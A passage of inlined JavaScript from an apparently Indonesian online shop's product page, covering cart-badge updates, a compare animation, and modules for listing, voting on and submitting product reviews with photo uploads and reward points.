   * Update cart badge
   */
  function updateCartBadge() {
    // Try to call global cart update function if exists
    if (typeof window.updateCartBadge === 'function') {
      window.updateCartBadge();
    } else {
      // Fallback: increment badge manually
      const badge = document.getElementById('cartCount');
      if (badge) {
        const currentCount = parseInt(badge.textContent) || 0;
        badge.textContent = currentCount + 1;
        badge.classList.add('active');
      }
    }
  }
  
  /**
   * Trigger fly to compare animation
   */
  function triggerFlyToCompareAnimation() {
    const compareBtn = document.getElementById('compareBtn');
    if (!compareBtn || !activeProductData) return;
    
    // Create flying element
    const flyingElement = document.createElement('div');
    flyingElement.className = 'flying-product';
    flyingElement.style.cssText = `
      position: fixed;
      width: 60px;
      height: 60px;
      z-index: 99999;
      pointer-events: none;
    `;
    
    flyingElement.innerHTML = `
      <img src="${activeProductData.image}" 
           style="width:100%;height:100%;object-fit:cover;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.3);">
    `;
    
    // Position at bottom sheet
    const sheetRect = bottomSheet.getBoundingClientRect();
    const targetRect = compareBtn.getBoundingClientRect();
    
    flyingElement.style.top = `${sheetRect.top + 20}px`;
    flyingElement.style.left = `${sheetRect.left + 20}px`;
    
    document.body.appendChild(flyingElement);
    
    // Animate to target
    requestAnimationFrame(() => {
      flyingElement.style.transition = 'all 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
      flyingElement.style.top = `${targetRect.top + 10}px`;
      flyingElement.style.left = `${targetRect.left + 10}px`;
      flyingElement.style.transform = 'scale(0.3)';
      flyingElement.style.opacity = '0';
    });
    
    // Clean up
    setTimeout(() => {
      if (flyingElement.parentNode) {
        flyingElement.parentNode.removeChild(flyingElement);
      }
    }, 800);
  }
  
  /**
   * Format price as Rupiah
   */
  function formatPrice(price) {
    if (!price || price === 0) return 'Rp 0';
    return 'Rp ' + parseInt(price).toLocaleString('id-ID');
  }
  
  /**
   * Escape HTML
   */
  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
  
  /**
   * Show toast notification (uses global showToast if available)
   */
  function showToast(message, type = 'info') {
    if (typeof window.showToast === 'function') {
      window.showToast({
        title: type === 'success' ? 'Berhasil' : type === 'error' ? 'Gagal' : 'Info',
        message: message,
        type: type,
        duration: 3000
      });
    } else {
      // Fallback: console log
      console.log(`[${type.toUpperCase()}] ${message}`);
    }
  }
  
  /**
   * Expose functions for external access
   */
  window.ProductCardActions = {
    openSheet: openBottomSheet,
    closeSheet: closeBottomSheet,
    updateCompareState: updateCompareButtonState
  };
  
})();

</script>
    <script data-inlined="product-reviews.js">
/**
 * Product Reviews - Frontend JavaScript
 * Handles review display, submission, and helpful voting
 */

const ProductReviews = (function() {
  'use strict';

  let currentPage = 1;
  let currentSort = 'helpful';
  let productId = null;
  let isLoading = false;

  /**
   * Public API: Initialize reviews for a product
   */
  function init(pid) {
    productId = pid;
    
    if (!productId) {
      console.warn('Product ID not provided to ProductReviews.init()');
      return;
    }

    initializeReviewTab();
    loadReviews();
  }

  /**
   * Initialize review tab functionality
   */
  function initializeReviewTab() {
    // Tab switching
    const tabButtons = document.querySelectorAll('.tab-btn');
    tabButtons.forEach(btn => {
      btn.addEventListener('click', function() {
        const tabName = this.dataset.tab;
        switchTab(tabName);
      });
    });

    // Sort dropdown
    const sortSelect = document.getElementById('review-sort');
    if (sortSelect) {
      sortSelect.addEventListener('change', function() {
        currentSort = this.value;
        currentPage = 1;
        loadReviews();
      });
    }

    // Load more button
    const loadMoreBtn = document.getElementById('load-more-reviews');
    if (loadMoreBtn) {
      loadMoreBtn.addEventListener('click', function() {
        currentPage++;
        loadReviews(true); // Append mode
      });
    }

    // Write review button
    const writeReviewBtn = document.getElementById('write-review-btn');
    if (writeReviewBtn) {
      writeReviewBtn.addEventListener('click', showReviewModal);
    }
  }

  /**
   * Switch between product tabs
   */
  function switchTab(tabName) {
    // Update button states
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.tab === tabName);
    });

    // Update content visibility
    document.querySelectorAll('.tab-content').forEach(content => {
      content.style.display = content.id === `${tabName}-tab` ? 'block' : 'none';
    });
  }

  /**
   * Load reviews from API
   */
  async function loadReviews(append = false) {
    if (isLoading) return;
    isLoading = true;

    const container = document.getElementById('reviews-list');
    const loadMoreBtn = document.getElementById('load-more-reviews');

    // Check if review section exists (product might not have reviews section)
    if (!container) {
      console.log('Review section not found - product may not have reviews yet');
      isLoading = false;
      return;
    }

    try {
      if (!append) {
        container.innerHTML = '<div class="review-loading">Memuat ulasan...</div>';
      } else {
        loadMoreBtn.disabled = true;
        loadMoreBtn.textContent = 'Memuat...';
      }

      const response = await fetch(`/api/reviews/list.php?product_id=${productId}&sort=${currentSort}&page=${currentPage}&limit=10`);
      const data = await response.json();

      if (!data.success) {
        throw new Error(data.message || 'Gagal memuat ulasan');
      }

      // Update statistics (only on initial load)
      if (!append && data.stats) {
        updateReviewStats(data.stats);
      }

      // Render reviews
      if (!append) {
        container.innerHTML = '';
      }

      const reviews = data.reviews || [];
      
      if (reviews.length === 0 && !append) {
        container.innerHTML = '<div class="no-reviews">Belum ada ulasan untuk produk ini. Jadilah yang pertama!</div>';
      } else {
        reviews.forEach(review => {
          container.appendChild(createReviewElement(review));
        });
      }

      // Update load more button
      if (loadMoreBtn) {
        if (data.pagination.has_more) {
          loadMoreBtn.style.display = 'block';
          loadMoreBtn.disabled = false;
          loadMoreBtn.textContent = 'Muat Lebih Banyak';
        } else {
          loadMoreBtn.style.display = 'none';
        }
      }

    } catch (error) {
      console.error('Load reviews error:', error);
      container.innerHTML = '<div class="review-error">Gagal memuat ulasan. Silakan coba lagi.</div>';
    } finally {
      isLoading = false;
    }
  }

  /**
   * Update review statistics display
   */
  function updateReviewStats(stats) {
    const avgRatingEl = document.getElementById('avg-rating');
    const totalReviewsEl = document.getElementById('total-reviews');
    const ratingBarsContainer = document.getElementById('rating-bars');

    if (avgRatingEl) {
      avgRatingEl.textContent = stats.average_rating.toFixed(1);
    }

    if (totalReviewsEl) {
      totalReviewsEl.textContent = `${stats.total_reviews} ulasan`;
    }

    // Update rating breakdown bars
    if (ratingBarsContainer) {
      ratingBarsContainer.innerHTML = '';
      stats.rating_breakdown.forEach(item => {
        const bar = document.createElement('div');
        bar.className = 'rating-bar';
        bar.innerHTML = `
          <span class="rating-label">${item.rating}â˜…</span>
          <div class="bar-container">
            <div class="bar-fill" style="width: ${item.percentage}%"></div>
          </div>
          <span class="rating-count">${item.count}</span>
        `;
        ratingBarsContainer.appendChild(bar);
      });
    }

    // Update tab count
    const reviewTab = document.querySelector('[data-tab="reviews"]');
    if (reviewTab && stats.total_reviews > 0) {
      reviewTab.textContent = `Ulasan (${stats.total_reviews})`;
    }
  }

  /**
   * Create review element
   */
  function createReviewElement(review) {
    const div = document.createElement('div');
    div.className = 'review-item';
    div.dataset.reviewId = review.ID;

    // Build stars
    const stars = 'â˜…'.repeat(review.RATING) + 'â˜†'.repeat(5 - review.RATING);

    // Build images if available
    let imagesHtml = '';
    if (review.images && review.images.length > 0) {
      imagesHtml = '<div class="review-images">';
      review.images.forEach(img => {
        imagesHtml += `<img src="${escapeHtml(img)}" alt="Review image" class="review-img" loading="lazy">`;
      });
      imagesHtml += '</div>';
    }

    // Verified purchase badge
    const verifiedBadge = review.IS_VERIFIED_PURCHASE === 'Y' 
      ? '<span class="verified-badge">âœ“ Pembelian Terverifikasi</span>' 
      : '';
    
    // Use DISPLAY_NAME if available (for anonymous reviews), otherwise use FULL_NAME
    const displayName = review.DISPLAY_NAME || review.FULL_NAME || 'Anonymous';
    const anonymousIndicator = review.IS_ANONYMOUS === 'Y' 
      ? '<span class="anonymous-badge" title="Nama pengguna disamarkan untuk privasi">ðŸ”’</span>' 
      : '';

    div.innerHTML = `
      <div class="review-header">
        <div class="review-author">
          <strong>${escapeHtml(displayName)}</strong>
          ${anonymousIndicator}
          ${verifiedBadge}
        </div>
        <div class="review-rating">
          <span class="stars">${stars}</span>
        </div>
      </div>
      <div class="review-date">${review.created_ago}</div>
      <div class="review-text">${escapeHtml(review.REVIEW_TEXT).replace(/\n/g, '<br>')}</div>
      ${imagesHtml}
      <div class="review-actions">
        <button class="btn-helpful" data-review-id="${review.ID}">
          <span class="helpful-icon">ðŸ‘</span>
          <span class="helpful-text">Membantu (${review.HELPFUL_COUNT || 0})</span>
        </button>
      </div>
    `;

    // Add helpful button listener
    const helpfulBtn = div.querySelector('.btn-helpful');
    helpfulBtn.addEventListener('click', () => markAsHelpful(review.ID));

    return div;
  }

  /**
   * Get CSRF token from meta tag
   */
  function getCsrfToken() {
    const metaTag = document.querySelector('meta[name="csrf-token"]');
    return metaTag ? metaTag.getAttribute('content') : '';
  }

  /**
   * Mark review as helpful
   */
  async function markAsHelpful(reviewId) {
    // Check if logged in
    const isLoggedIn = document.body.classList.contains('logged-in') || 
                      document.querySelector('meta[name="user-logged-in"]')?.content === 'true';

    if (!isLoggedIn) {
      showModal({
        title: 'Login Diperlukan',
        message: 'Silakan login terlebih dahulu untuk memberikan vote pada ulasan ini.',
        icon: 'info',
        buttons: [
          { text: 'Batal', className: 'modal-btn-secondary' },
          { text: 'Login', className: 'modal-btn-primary', callback: () => window.location.href = '/login' }
        ]
      });
      return;
    }

    // Get current button element
    const reviewItem = document.querySelector(`[data-review-id="${reviewId}"]`);
    const helpfulBtn = reviewItem?.querySelector('.btn-helpful');
    
    if (!helpfulBtn) return;
    
    // Disable button during request
    helpfulBtn.disabled = true;
    const originalText = helpfulBtn.querySelector('.helpful-text').textContent;

    try {
      const response = await fetch('/api/reviews/helpful.php', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCsrfToken()
        },
        credentials: 'same-origin',
        body: JSON.stringify({ 
          csrf_token: getCsrfToken(),
          review_id: reviewId 
        })
      });

      const data = await response.json();

      if (data.success) {
        // Update button count immediately based on action
        const currentCount = parseInt(originalText.match(/\d+/)?.[0] || 0);
        const newCount = data.action === 'added' ? currentCount + 1 : currentCount - 1;
        helpfulBtn.querySelector('.helpful-text').textContent = `Membantu (${newCount})`;
        
        // Show success message
        showToast(data.message, 'success');
        
        // Re-enable button
        helpfulBtn.disabled = false;
      } else {
        showToast(data.message, 'error');
        helpfulBtn.disabled = false;
      }

    } catch (error) {
      console.error('Mark helpful error:', error);
      showToast('Gagal memberikan vote. Silakan coba lagi.', 'error');
      helpfulBtn.disabled = false;
    }
  }

  /**
   * Show review submission modal (placeholder)
   */
  function showReviewModal() {
    // TODO: Implement review modal
    // For now, redirect to account page
    window.location.href = '/account/orders';
  }

  /**
   * Show toast notification
   */
  function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `review-toast toast-${type}`;
    toast.textContent = message;
    
    document.body.appendChild(toast);
    
    setTimeout(() => {
      toast.classList.add('show');
    }, 100);
    
    setTimeout(() => {
      toast.classList.remove('show');
      setTimeout(() => toast.remove(), 300);
    }, 3000);
  }

  /**
   * Show modal dialog
   * @param {Object} options - Modal options
   * @param {string} options.title - Modal title
   * @param {string} options.message - Modal message
   * @param {string} options.icon - Icon type (info, success, warning, danger)
   * @param {Array} options.buttons - Array of button objects {text, className, callback}
   */
  function showModal(options) {
    const {
      title = 'Konfirmasi',
      message = '',
      icon = 'info',
      buttons = [{ text: 'OK', className: 'modal-btn-primary' }]
    } = options;

    // Icon emoji mapping
    const iconEmojis = {
      info: 'â„¹ï¸',
      success: 'âœ“',
      warning: 'âš ï¸',
      danger: 'âœ•'
    };

    // Create modal HTML
    const modalHTML = `
      <div class="modal-overlay" id="helpful-vote-modal" style="display: flex !important; align-items: center !important; justify-content: center !important;">
        <div class="modal-dialog">
          <div class="modal-header">
            <h3 class="modal-title">
              <span class="modal-icon ${icon}">${iconEmojis[icon] || iconEmojis.info}</span>
              ${escapeHtml(title)}
            </h3>
          </div>
          <div class="modal-body">
            <p class="modal-message">${escapeHtml(message)}</p>
            <div class="modal-actions">
              ${buttons.map((btn, index) => 
                `<button class="modal-btn ${btn.className || 'modal-btn-secondary'}" data-index="${index}">${escapeHtml(btn.text)}</button>`
              ).join('')}
            </div>
          </div>
        </div>
      </div>
    `;

    // Append to body
    const tempDiv = document.createElement('div');
    tempDiv.innerHTML = modalHTML;
    const modal = tempDiv.firstElementChild;
    document.body.appendChild(modal);

    // Add event listeners to buttons
    buttons.forEach((btn, index) => {
      const btnElement = modal.querySelector(`[data-index="${index}"]`);
      btnElement.addEventListener('click', () => {
        closeModal(modal);
        if (btn.callback && typeof btn.callback === 'function') {
          btn.callback();
        }
      });
    });

    // Close on overlay click
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        closeModal(modal);
      }
    });

    // Show modal with animation
    setTimeout(() => modal.classList.add('show'), 10);
  }

  /**
   * Close modal dialog
   */
  function closeModal(modal) {
    modal.classList.remove('show');
    setTimeout(() => modal.remove(), 200);
  }

  /**
   * Escape HTML for XSS protection
   */
  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }

  /**
   * Get product ID from URL
   */
  function getProductIdFromUrl() {
    const match = window.location.pathname.match(/\/product\/(\d+)/);
    return match ? match[1] : null;
  }

  // Public API
  return {
    init: init
  };

})();

</script>
    <script data-inlined="review-submission.js">
/**
 * Review Submission Modal & Handler
 * Handles review form display, validation, and submission
 */

(function() {
    'use strict';

    let currentProductId = null;
    let currentOrderId = null;
    let currentSoRefId = null;
    let selectedRating = 0;
    let uploadedImages = [];

    // Get CSRF token from meta tag
    function getCsrfToken() {
        const metaTag = document.querySelector('meta[name="csrf-token"]');
        return metaTag ? metaTag.getAttribute('content') : '';
    }

    // Initialize
    function init() {
        createReviewModal();
        attachEventListeners();
        loadReviewableOrders();
    }

    // Create review modal HTML
    function createReviewModal() {
        const modalHTML = `
            <div class="modal-overlay" id="review-modal-overlay" style="display:none;">
                <div class="modal-content review-modal">
                    <div class="modal-header">
                        <h3 class="modal-title">Tulis Ulasan</h3>
                        <button type="button" class="modal-close" id="review-modal-close" aria-label="Tutup">
                            <svg width="20" height="20" viewBox="0 0 24 24">
                                <path fill="currentColor" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
                            </svg>
                        </button>
                    </div>
                    
                    <div class="modal-body">
                        <form id="review-form" class="review-form">
                            <!-- Product Info -->
                            <div class="review-product-info" id="review-product-info">
                                <img id="review-product-image" src="" alt="" class="review-product-thumb">
                                <div class="review-product-details">
                                    <h4 id="review-product-name"></h4>
                                    <p id="review-product-sku"></p>
                                </div>
                            </div>

                            <!-- Rating -->
                            <div class="form-group">
                                <label class="form-label">Rating <span style="color:#8adeff;">*</span></label>
                                <div class="star-rating-input" id="star-rating-input">
                                    <button type="button" class="star-btn" data-rating="1">â˜…</button>
                                    <button type="button" class="star-btn" data-rating="2">â˜…</button>
                                    <button type="button" class="star-btn" data-rating="3">â˜…</button>
                                    <button type="button" class="star-btn" data-rating="4">â˜…</button>
                                    <button type="button" class="star-btn" data-rating="5">â˜…</button>
                                </div>
                                <p class="rating-label" id="rating-label">Pilih rating Anda</p>
                            </div>

                            <!-- Review Text -->
                            <div class="form-group">
                                <label class="form-label" for="review-text">Ulasan Anda <span style="color:#8adeff;">*</span></label>
                                <textarea 
                                    id="review-text" 
                                    name="review_text"
                                    class="form-control" 
                                    rows="6" 
                                    placeholder="Ceritakan pengalaman Anda dengan produk ini..."
                                    minlength="20"
                                    maxlength="5000"
                                    required></textarea>
                                <p class="form-hint">
                                    <span id="review-char-count">0</span>/5000 karakter
                                    <span style="color:#059669;font-weight:500;">
                                        ðŸ’° +1,000 point untuk ulasan â‰¥ 100 karakter
                                    </span>
                                </p>
                            </div>

                            <!-- Image Upload -->
                            <div class="form-group">
                                <label class="form-label">Upload Foto (Opsional)</label>
                                <div class="image-upload-container">
                                    <input type="file" 
                                           id="review-images" 
                                           name="images[]" 
                                           accept="image/jpeg,image/jpg,image/png,image/webp"
                                           multiple
                                           style="display:none;">
                                    <button type="button" class="btn-upload-trigger" id="upload-trigger">
                                        <svg width="24" height="24" viewBox="0 0 24 24">
                                            <path fill="currentColor" d="M19 7v2.99s-1.99.01-2 0V7h-3s.01-1.99 0-2h3V2h2v3h3v2h-3zm-3 4V8h-3V5H5c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8h-3zM5 19l3-4 2 3 3-4 4 5H5z"/>
                                        </svg>
                                        <span>Pilih Foto</span>
                                    </button>
                                    <p class="form-hint">
                                        Max 5 foto, format JPG/PNG/WebP, max 2MB per foto
                                        <span style="color:#059669;font-weight:500;">
                                            ðŸ’° +2,000 point untuk ulasan dengan foto
                                        </span>
                                    </p>
                                </div>
                                <div class="image-preview-grid" id="image-preview-grid"></div>
                            </div>

                            <!-- Point Reward Info -->
                            <div class="point-reward-info">
                                <div class="pri-header">
                                    <span>ðŸŽ</span>
                                    <span>Dapatkan Point Reward</span>
                                </div>
                                <ul class="pri-list">
                                    <li>âœ… Ulasan dasar: <strong>5,000 point</strong></li>
                                    <li id="pri-long-text" style="opacity:0.5;">ðŸ“ Ulasan panjang (â‰¥100 kata): <strong>+1,000 point</strong></li>
                                    <li id="pri-images" style="opacity:0.5;">ðŸ“¸ Dengan foto: <strong>+2,000 point</strong></li>
                                </ul>
                                <div class="pri-total">
                                    Total Reward: <strong id="pri-total-points">5,000 point</strong>
                                </div>
                            </div>

                            <!-- Privacy Option -->
                            <div class="form-group" style="margin-top:20px;padding:15px;background:#f8fafc;border-radius:8px;">
                                <label class="checkbox-label" style="display:flex;align-items:center;cursor:pointer;margin:0;">
                                    <input type="checkbox" 
                                           id="review-anonymous" 
                                           name="is_anonymous"
                                           style="margin-right:8px;width:18px;height:18px;cursor:pointer;">
                                    <span style="font-size:14px;">
                                        <strong>ðŸ”’ Sembunyikan nama saya</strong>
                                        <span style="color:#64748b;display:block;font-size:13px;margin-top:4px;" id="review-anonymous-preview">
                                            Nama Anda akan ditampilkan dengan disamarkan untuk menjaga privasi
                                        </span>
                                    </span>
                                </label>
                            </div>

                            <!-- Error Alert -->
                            <div class="form-error" id="review-form-error" style="display:none;"></div>

                            <!-- Submit Buttons -->
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" id="review-cancel">Batal</button>
                                <button type="submit" class="btn btn-primary" id="review-submit">
                                    Kirim Ulasan
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        `;

        document.body.insertAdjacentHTML('beforeend', modalHTML);
    }

    // Attach event listeners
    function attachEventListeners() {
        // Modal triggers - event delegation
        document.addEventListener('click', function(e) {
            const btn = e.target.closest('.btn-write-review');
            if (btn) {
                e.preventDefault();
                openReviewModal(
                    btn.dataset.productId,
                    btn.dataset.orderId,
                    btn.dataset.productName,
                    btn.dataset.productImage,
                    btn.dataset.productSku,
                    btn.dataset.soRefId || null
                );
            }
        });

        // Close modal
        setTimeout(() => {
            const closeBtn = document.getElementById('review-modal-close');
            const cancelBtn = document.getElementById('review-cancel');
            const overlay = document.getElementById('review-modal-overlay');

            if (closeBtn) {
                closeBtn.addEventListener('click', closeReviewModal);
            }
            if (cancelBtn) {
                cancelBtn.addEventListener('click', closeReviewModal);
            }
            if (overlay) {
                overlay.addEventListener('click', function(e) {
                    if (e.target === overlay) closeReviewModal();
                });
            }
        }, 100);

        // Star rating
        setTimeout(() => {
            const starButtons = document.querySelectorAll('.star-btn');
            starButtons.forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    const rating = parseInt(this.dataset.rating);
                    setRating(rating);
                });
            });
        }, 100);

        // Character count
        setTimeout(() => {
            const textarea = document.getElementById('review-text');
            if (textarea) {
                textarea.addEventListener('input', function() {
                    updateCharCount();
                    calculatePotentialPoints();
                });
            }
        }, 100);

        // Image upload
        setTimeout(() => {
            const uploadTrigger = document.getElementById('upload-trigger');
            const fileInput = document.getElementById('review-images');
            
            if (uploadTrigger && fileInput) {
                uploadTrigger.addEventListener('click', () => fileInput.click());
                fileInput.addEventListener('change', handleImageSelection);
            }
        }, 100);

        // Form submit
        setTimeout(() => {
            const form = document.getElementById('review-form');
            if (form) {
                form.addEventListener('submit', handleSubmit);
            }
        }, 100);
    }

    // Open review modal
    function openReviewModal(productId, orderId, productName, productImage, productSku, soRefId = null) {
        const overlay = document.getElementById('review-modal-overlay');
        if (!overlay) {
            console.error('Modal overlay not found!');
            return;
        }
        
        currentProductId = productId;
        currentOrderId = orderId;
        currentSoRefId = soRefId;
        selectedRating = 0;
        uploadedImages = [];

        // Set product info
        const nameEl = document.getElementById('review-product-name');
        const imageEl = document.getElementById('review-product-image');
        const skuEl = document.getElementById('review-product-sku');
        
        if (nameEl) nameEl.textContent = productName;
        if (imageEl) imageEl.src = productImage || '/assets/img/no-image.png';
        if (skuEl) skuEl.textContent = 'SKU: ' + productSku;

        // Update privacy preview with actual user name
        updatePrivacyPreview();

        // Reset form
        const form = document.getElementById('review-form');
        const previewGrid = document.getElementById('image-preview-grid');
        const errorEl = document.getElementById('review-form-error');
        
        if (form) form.reset();
        if (previewGrid) previewGrid.innerHTML = '';
        if (errorEl) errorEl.style.display = 'none';
        
        setRating(0);
        updateCharCount();
        calculatePotentialPoints();

        // Show modal
        overlay.style.display = 'flex';
        overlay.classList.add('show');
        document.body.style.overflow = 'hidden';
    }

    // Close review modal
    function closeReviewModal() {
        const overlay = document.getElementById('review-modal-overlay');
        if (overlay) {
            overlay.classList.remove('show');
            setTimeout(() => {
                overlay.style.display = 'none';
            }, 200); // Wait for fade animation
        }
        document.body.style.overflow = '';
    }

    // Set star rating
    function setRating(rating) {
        selectedRating = rating;
        const stars = document.querySelectorAll('.star-btn');
        const labels = ['', 'Sangat Buruk', 'Buruk', 'Cukup', 'Bagus', 'Sangat Bagus'];
        
        stars.forEach((star, index) => {
            if (index < rating) {
                star.classList.add('active');
            } else {
                star.classList.remove('active');
            }
        });

        document.getElementById('rating-label').textContent = labels[rating] || 'Pilih rating Anda';
    }

    // Update character count
    function updateCharCount() {
        const textarea = document.getElementById('review-text');
        const count = textarea.value.length;
        document.getElementById('review-char-count').textContent = count;
    }

    // Calculate potential points
    function calculatePotentialPoints() {
        const textarea = document.getElementById('review-text');
        if (!textarea) return;
        
        const charCount = textarea.value.trim().length;
        const hasImages = uploadedImages.length > 0;

        let totalPoints = 5000;
        let longTextActive = charCount >= 100;
        let imagesActive = hasImages;

        if (longTextActive) totalPoints += 1000;
        if (imagesActive) totalPoints += 2000;

        // Update UI
        const longTextEl = document.getElementById('pri-long-text');
        const imagesEl = document.getElementById('pri-images');
        const totalEl = document.getElementById('pri-total-points');
        
        if (longTextEl) longTextEl.style.opacity = longTextActive ? '1' : '0.5';
        if (imagesEl) imagesEl.style.opacity = imagesActive ? '1' : '0.5';
        if (totalEl) totalEl.textContent = totalPoints.toLocaleString('id-ID') + ' point';
    }

    // Handle image selection
    function handleImageSelection(e) {
        const files = Array.from(e.target.files);
        
        if (files.length > 5) {
            showError('Maksimal 5 foto yang dapat diupload');
            e.target.value = ''; // Reset input
            return;
        }

        uploadedImages = [];
        const previewGrid = document.getElementById('image-preview-grid');
        previewGrid.innerHTML = '';

        files.forEach((file, index) => {
            // Validate file type
            if (!file.type.match(/image\/(jpeg|jpg|png|webp)/)) {
                showError('Format file harus JPG, PNG, atau WebP');
                return;
            }

            // Validate file size (2MB)
            if (file.size > 2 * 1024 * 1024) {
                showError('Ukuran file maksimal 2MB');
                return;
            }

            uploadedImages.push(file);

            // Create preview
            const reader = new FileReader();
            reader.onload = function(e) {
                const previewHTML = `
                    <div class="image-preview-item">
                        <img src="${e.target.result}" alt="Preview ${index + 1}">
                        <button type="button" class="remove-image" data-index="${index}" aria-label="Hapus">
                            <svg width="16" height="16" viewBox="0 0 24 24">
                                <path fill="currentColor" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
                            </svg>
                        </button>
                    </div>
                `;
                previewGrid.insertAdjacentHTML('beforeend', previewHTML);
            };
            reader.readAsDataURL(file);
        });

        calculatePotentialPoints();

        // Attach remove handlers
        setTimeout(() => {
            document.querySelectorAll('.remove-image').forEach(btn => {
                btn.addEventListener('click', function() {
                    const index = parseInt(this.dataset.index);
                    removeImage(index);
                });
            });
        }, 100);
    }

    // Remove image
    function removeImage(index) {
        uploadedImages.splice(index, 1);
        
        const previewGrid = document.getElementById('image-preview-grid');
        previewGrid.innerHTML = '';

        uploadedImages.forEach((file, idx) => {
            const reader = new FileReader();
            reader.onload = function(e) {
                const previewHTML = `
                    <div class="image-preview-item">
                        <img src="${e.target.result}" alt="Preview ${idx + 1}">
                        <button type="button" class="remove-image" data-index="${idx}" aria-label="Hapus">
                            <svg width="16" height="16" viewBox="0 0 24 24">
                                <path fill="currentColor" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
                            </svg>
                        </button>
                    </div>
                `;
                previewGrid.insertAdjacentHTML('beforeend', previewHTML);
            };
            reader.readAsDataURL(file);
        });

        calculatePotentialPoints();

        setTimeout(() => {
            document.querySelectorAll('.remove-image').forEach(btn => {
                btn.addEventListener('click', function() {
                    const idx = parseInt(this.dataset.index);
                    removeImage(idx);
                });
            });
        }, 100);
    }

    // Handle form submission
    async function handleSubmit(e) {
        e.preventDefault();

        // Validate
        if (selectedRating === 0) {
            showError('Silakan pilih rating terlebih dahulu');
            return;
        }

        const reviewText = document.getElementById('review-text').value.trim();
        if (reviewText.length < 20) {
            showError('Ulasan minimal 20 karakter');
            return;
        }

        const submitBtn = document.getElementById('review-submit');
        submitBtn.disabled = true;
        
        try {
            // Step 1: Upload images if any
            let imageUrls = [];
            if (uploadedImages.length > 0) {
                submitBtn.textContent = 'Mengupload foto...';
                imageUrls = await uploadImages();
                if (!imageUrls) {
                    // Upload failed
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Kirim Ulasan';
                    return;
                }
            }

            // Step 2: Submit review with image URLs
            submitBtn.textContent = 'Mengirim ulasan...';
            
            const payload = {
                csrf_token: getCsrfToken(),
                product_id: currentProductId,
                order_id: currentOrderId || 0,
                so_ref_id: currentSoRefId || undefined,
                rating: selectedRating,
                review_text: reviewText,
                is_anonymous: document.getElementById('review-anonymous').checked,
                images: imageUrls
            };

            const response = await fetch('/api/reviews/submit.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': getCsrfToken()
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();

            if (result.success) {
                showSuccess(result.message || 'Ulasan berhasil dikirim!');
                closeReviewModal();
                
                // Refresh reviewable orders if on account page
                if (typeof loadReviewableOrders === 'function') {
                    setTimeout(loadReviewableOrders, 500);
                }
            } else {
                showError(result.message || 'Gagal mengirim ulasan');
            }
        } catch (error) {
            console.error('Submit error:', error);
            showError('Terjadi kesalahan saat mengirim ulasan');
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'Kirim Ulasan';
        }
    }

    /**
     * Upload images to server
     * @returns {Promise<Array|null>} Array of image URLs or null if failed
     */
    async function uploadImages() {
        if (uploadedImages.length === 0) {
            return [];
        }

        const formData = new FormData();
        uploadedImages.forEach(file => {
            formData.append('images[]', file);
        });

        try {
            const response = await fetch('/api/reviews/upload_images.php', {
                method: 'POST',
                headers: {
                    'X-CSRF-Token': getCsrfToken()
                },
                body: formData
            });

            // Check if response is JSON
            const contentType = response.headers.get('content-type');
            if (!contentType || !contentType.includes('application/json')) {
                const text = await response.text();
                console.error('Non-JSON response:', text);
                showError('Server error: Response bukan JSON. Cek browser console untuk detail.');
                return null;
            }

            const result = await response.json();

            if (result.success && result.images) {
                // Extract URLs from uploaded images
                return result.images.map(img => img.url);
            } else {
                showError(result.message || 'Gagal mengupload foto');
                return null;
            }
        } catch (error) {
            console.error('Upload images error:', error);
            showError('Terjadi kesalahan saat mengupload foto. Cek console untuk detail.');
            return null;
        }
    }

    // Load reviewable orders (for account page)
    async function loadReviewableOrders() {
        // Only run if on account/profile page
        const container = document.getElementById('reviewable-orders-list');
        const loading = document.getElementById('reviewable-orders-loading');
        const empty = document.getElementById('reviewable-orders-empty');
        
        if (!container) {
            return;
        }

        // Show loading
        if (loading) loading.style.display = 'block';
        if (empty) empty.style.display = 'none';
        container.innerHTML = '';

        try {
            const response = await fetch('/api/reviews/reviewable.php');
            const result = await response.json();

            if (loading) loading.style.display = 'none';

            if (result.success && result.data.length > 0) {
                renderReviewableOrders(result.data);
                if (empty) empty.style.display = 'none';
            } else {
                if (empty) empty.style.display = 'block';
            }
        } catch (error) {
            console.error('Load reviewable orders error:', error);
            if (loading) loading.style.display = 'none';
            if (empty) {
                empty.innerHTML = '<p>Gagal memuat data. Silakan refresh halaman.</p>';
                empty.style.display = 'block';
            }
        }
    }

    // Render reviewable orders
    function renderReviewableOrders(orders) {
        const container = document.getElementById('reviewable-orders-list');
        if (!container) return;

        let html = '';
        
        orders.forEach(order => {
            html += `
                <div class="reviewable-order-item">
                    <img src="${escapeHtml(order.product_image || '/assets/img/no-image.png')}" alt="${escapeHtml(order.product_name)}" class="roi-image">
                    <div class="roi-info">
                        <h4>${escapeHtml(order.product_name)}</h4>
                        <p class="roi-meta">Order: ${escapeHtml(order.order_number)}</p>
                        <p class="roi-meta">Dibeli: ${escapeHtml(order.order_date)}</p>
                    </div>
                    <button type="button" 
                            class="btn btn-primary btn-write-review"
                            data-product-id="${order.product_id}"
                            data-order-id="${order.order_id || ''}"
